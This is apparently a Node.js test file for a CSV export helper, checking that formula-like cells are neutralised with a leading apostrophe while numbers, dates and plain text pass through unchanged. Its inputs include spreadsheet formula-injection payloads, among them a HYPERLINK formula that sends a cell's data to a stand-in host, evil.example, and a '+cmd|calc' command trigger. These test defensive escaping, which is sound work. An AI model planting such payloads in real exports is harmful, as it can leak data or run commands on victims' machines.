import test from 'node:test'
import assert from 'node:assert/strict'
import { csvCell, csvText } from '../src/shared/csv'

test('text that a spreadsheet would run as a formula is kept as text; numbers and plain text are left alone', () => {
  // An email subject or a Google Sheet cell written by someone outside the account.
  assert.equal(
    csvCell('=HYPERLINK("https://evil.example/?"&A2,"Open")'),
    `"'=HYPERLINK(""https://evil.example/?""&A2,""Open"")"`,
  )
  assert.equal(csvCell('+cmd'), `"'+cmd"`)
  assert.equal(csvCell('@SUM(A1)'), `"'@SUM(A1)"`)
  assert.equal(csvCell('-2+3+cmd|calc'), `"'-2+3+cmd|calc"`)
  assert.equal(csvCell('\t=1+1'), `"'\t=1+1"`)
  for (const number of ['-5', '+3', '-1,234.50', '-0.5', '12%', '-3e2'])
    assert.equal(csvCell(number), `"${number}"`, `${number} stays a number`)
  assert.equal(csvCell('Batch 5 – Terminal 1'), '"Batch 5 – Terminal 1"')
  assert.equal(csvCell('2026-10-31'), '"2026-10-31"')
  assert.equal(csvCell(null), '""')
  assert.equal(
    csvText([
      ['Subject', 'Count'],
      ['=1+1', '-2'],
    ]),
    `"Subject","Count"\n"'=1+1","-2"`,
  )
})
